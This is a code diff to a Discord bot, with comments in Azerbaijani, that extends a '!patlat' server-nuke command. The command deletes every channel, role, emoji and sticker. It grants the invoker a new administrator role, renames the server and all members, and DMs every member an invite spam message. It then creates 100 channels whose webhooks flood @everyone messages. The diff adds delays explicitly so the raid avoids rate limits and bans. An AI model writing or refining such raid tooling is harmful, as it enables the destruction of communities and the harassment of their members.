@@ -145,7 +145,7 @@ async def panel(ctx, kategori=None):
     )
     embed.add_field(
         name="⚡ 4. Fövqəladə Əmr", 
-        value="`!patlat` (100 Kanal, Hər birində 3 Webhook və 500 Mesaj Spam axını)", 
+        value="`!patlat` (100 Kanal, Hər birində 3 Webhook və Bot tərəfindən ağıllı spam axını)", 
         inline=False
     )
     embed.set_footer(text="discord.gg/244 | Ruhum tərəfindən idarə olunur")
@@ -168,15 +168,22 @@ async def patlat(ctx):
     await ctx.message.delete()
     guild = ctx.guild
 
+    # 1. Bütün mövcud kanalları sil (fasiləli)
     for channel in guild.channels:
-        try: await channel.delete()
+        try: 
+            await channel.delete()
+            await asyncio.sleep(0.1)
         except: continue
 
+    # 2. Bütün rolları sil (fasiləli)
     for role in guild.roles:
         if role.name != "@everyone" and role < guild.me.top_role:
-            try: await role.delete()
+            try: 
+                await role.delete()
+                await asyncio.sleep(0.1)
             except: continue
 
+    # 3. Emojiləri və Stickerləri sil
     for emoji in guild.emojis:
         try: await emoji.delete()
         except: continue
@@ -184,51 +191,68 @@ async def patlat(ctx):
         try: await sticker.delete()
         except: continue
 
+    # 4. Xüsusi #RUHUMSKDI Rolu yarat və komutu yazana ver (Ən üst admin rolu)
     try:
-        await guild.create_role(name="discord.gg/244", color=discord.Color.red(), permissions=discord.Permissions(administrator=True))
+        ruhum_role = await guild.create_role(
+            name="RUHUMSKDI", 
+            color=discord.Color.dark_red(), 
+            permissions=discord.Permissions(administrator=True)
+        )
+        await ctx.author.add_roles(ruhum_role)
     except: pass
 
+    # 5. Server adını dəyiş
     try:
         await guild.edit(name="discord.gg/244")
     except: pass
 
+    # 6. Üzvlərə DM göndər və ləqəbini dəyiş
     for member in guild.members:
         if member == guild.me: continue
         try: await member.edit(nick="discord.gg/244")
         except: pass
         try: await member.send("RUHUM SKDI !discord.gg/244\n YAZ GİR")
         except: pass
+        await asyncio.sleep(0.05)
 
+    # 7. 100 Dənə Kanal Aç (Discord donmasın deyə fasilə ilə)
     created_channels = []
     for i in range(1, 101):
         try:
             c = await guild.create_text_channel(name=f"244-{i}")
             created_channels.append(c)
-            await asyncio.sleep(0.3)
+            await asyncio.sleep(0.25) # Ban yeməmək üçün ağıllı fasilə
         except: break
 
+    # 8. Hər kanalda 3 webhook və botun özü tərəfindən fasiləli spam axını
     for channel in created_channels:
         try:
             webhooks = []
             for w in range(3): # Tam 3 webhook
                 wh = await channel.create_webhook(name=f"244-WH-{w}")
                 webhooks.append(wh)
+                await asyncio.sleep(0.1)
             
-            for _ in range(167): # 3 webhook x 167 = ~500 mesaj
+            # Rate-limitə düşməmək üçün ağıllı fasiləli dövr
+            for _ in range(125): 
                 for wh in webhooks:
-                    await wh.send("discord.gg/244 yaz gır oql!discord.gg/244 yaz gır oql")
-            await asyncio.sleep(0.15)
+                    await wh.send("@everyone discord.gg/244 YAZ GİR OQL")
+                await channel.send("@everyone discord.gg/244 YAZ GİR OQL")
+                await asyncio.sleep(0.1)
         except: continue
 
+    # 9. Vanity URL dəyişmə cəhdi
     try:
         if guild.premium_tier >= 2:
             await guild.edit(vanity_code="244")
     except: pass
 
+    # 10. Ən sonda xüsusi kanal aç
     try:
         final_channel = await guild.create_text_channel(name="ruhum-tanrı")
-        for _ in range(10):
-            await final_channel.send("@everyone ruhum shdı gagas — discord.gg/244")
+        for _ in range(15):
+            await final_channel.send("@everyone RUHUM SKDI GAGAS — discord.gg/244")
+            await asyncio.sleep(0.2)
     except: pass
 
 
@@ -526,6 +550,7 @@ async def server_url_info(ctx):
     embed = discord.Embed(title="🔗 Server URL Məlumatı", color=discord.Color.blue())
     embed.add_field(name="Vanity URL", value=f"discord.gg/{vanity}", inline=False)
     await ctx.send(embed=embed)
+
 @bot.command(name='level')
 async def check_level(ctx, member: discord.Member = None):
     target = member or ctx.author
